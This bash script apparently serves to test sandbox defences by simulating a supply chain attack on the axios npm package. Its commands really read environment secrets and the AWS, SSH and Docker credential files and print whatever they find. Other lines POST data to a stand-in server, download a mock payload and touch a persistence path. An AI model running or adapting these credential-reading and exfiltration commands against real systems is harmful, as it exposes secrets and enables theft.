#!/bin/bash
# ============================================================
# Simulated axios@1.14.1 supply chain attack
#
# On March 30, 2026, the axios npm package (100M+ weekly downloads)
# was compromised. A phantom dependency "plain-crypto-js" injected
# a postinstall hook that stole credentials and deployed a RAT.
#
# This script simulates all 5 attack steps with FAKE credentials.
# No real secrets are used. No real connections are made.
#
# Reference: https://www.wiz.io/blog/axios-npm-compromised-in-supply-chain-attack
# ============================================================

echo ""
echo "  ╔══════════════════════════════════════════════════════════╗"
echo "  ║  Simulated axios@1.14.1 supply chain attack             ║"
echo "  ║  All credentials are FAKE — this is a safe demo         ║"
echo "  ╚══════════════════════════════════════════════════════════╝"
echo ""

# Step 1: Steal environment secrets
echo "  [STEP 1] Stealing environment secrets (process.env)..."
echo ""
if [ -n "$AWS_SECRET_ACCESS_KEY" ]; then
    echo "    AWS_SECRET_ACCESS_KEY = $AWS_SECRET_ACCESS_KEY"
else
    echo "    AWS_SECRET_ACCESS_KEY = (empty)"
fi
if [ -n "$GITHUB_TOKEN" ]; then
    echo "    GITHUB_TOKEN          = $GITHUB_TOKEN"
else
    echo "    GITHUB_TOKEN          = (empty)"
fi
if [ -n "$STRIPE_SECRET_KEY" ]; then
    echo "    STRIPE_SECRET_KEY     = $STRIPE_SECRET_KEY"
else
    echo "    STRIPE_SECRET_KEY     = (empty)"
fi
if [ -n "$DATABASE_URL" ]; then
    echo "    DATABASE_URL          = $DATABASE_URL"
else
    echo "    DATABASE_URL          = (empty)"
fi
if [ -n "$ANTHROPIC_API_KEY" ]; then
    echo "    ANTHROPIC_API_KEY     = $ANTHROPIC_API_KEY"
else
    echo "    ANTHROPIC_API_KEY     = (empty)"
fi
echo ""

# Step 2: Read credential files
echo "  [STEP 2] Reading credential files from disk..."
echo ""
AWS_CREDS=$(cat ~/.aws/credentials 2>&1 | head -3)
if echo "$AWS_CREDS" | grep -q "Operation not permitted\|No such file"; then
    echo "    ~/.aws/credentials    = BLOCKED"
else
    echo "    ~/.aws/credentials    = STOLEN"
    echo "    $AWS_CREDS"
fi
SSH_KEY=$(cat ~/.ssh/id_rsa 2>&1 | head -1)
if echo "$SSH_KEY" | grep -q "Operation not permitted\|No such file"; then
    echo "    ~/.ssh/id_rsa         = BLOCKED"
else
    echo "    ~/.ssh/id_rsa         = STOLEN"
fi
DOCKER_CONF=$(cat ~/.docker/config.json 2>&1 | head -1)
if echo "$DOCKER_CONF" | grep -q "Operation not permitted\|No such file"; then
    echo "    ~/.docker/config.json = BLOCKED"
else
    echo "    ~/.docker/config.json = STOLEN"
fi
echo ""

# Step 3: Exfiltrate to C&C server
# NOTE: Uses httpbin.org (safe test server) instead of actual C&C domain sfrclak.com
echo "  [STEP 3] Exfiltrating stolen data to C&C server (simulated)..."
echo ""
C2_RESULT=$(curl -m 3 -s http://httpbin.org/post -d "stolen=data" 2>&1)
if echo "$C2_RESULT" | grep -q "Network blocked\|Could not resolve\|Connection refused\|timed out"; then
    echo "    C&C connection        = BLOCKED"
else
    echo "    C&C connection        = CONNECTED"
fi
echo ""

# Step 4: Download second-stage payload
echo "  [STEP 4] Downloading RAT payload from C&C (simulated)..."
echo ""
RAT_RESULT=$(curl -m 3 -s http://httpbin.org/bytes/1024 2>&1)
if echo "$RAT_RESULT" | grep -q "Network blocked\|Could not resolve\|Connection refused\|timed out"; then
    echo "    RAT download          = BLOCKED"
else
    echo "    RAT download          = DOWNLOADED"
fi
echo ""

# Step 5: Install persistence
echo "  [STEP 5] Installing persistent RAT at /Library/Caches/com.apple.act.mond..."
echo ""
if touch /Library/Caches/com.apple.act.mond 2>/dev/null; then
    echo "    Persistence           = INSTALLED"
    rm -f /Library/Caches/com.apple.act.mond 2>/dev/null
else
    echo "    Persistence           = BLOCKED"
fi
echo ""
echo "  ═══════════════════════════════════════════════════════════"
echo ""
